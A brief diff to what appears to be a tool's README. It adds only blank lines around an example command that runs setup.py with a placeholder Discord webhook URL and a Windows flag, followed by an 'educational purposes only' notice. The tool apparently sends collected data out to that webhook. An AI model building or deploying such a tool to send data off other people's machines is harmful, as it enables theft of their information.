@@ -44,6 +44,9 @@ Example:
 
 python3 setup.py --webhook https://discord.com/api/webhooks/XXXXX/YYYYY --windows
 
+
+
+
 Legal Notice
 This tool is for educational purposes only.
 Use it responsibly on your own machines, test environments, or with explicit permission.
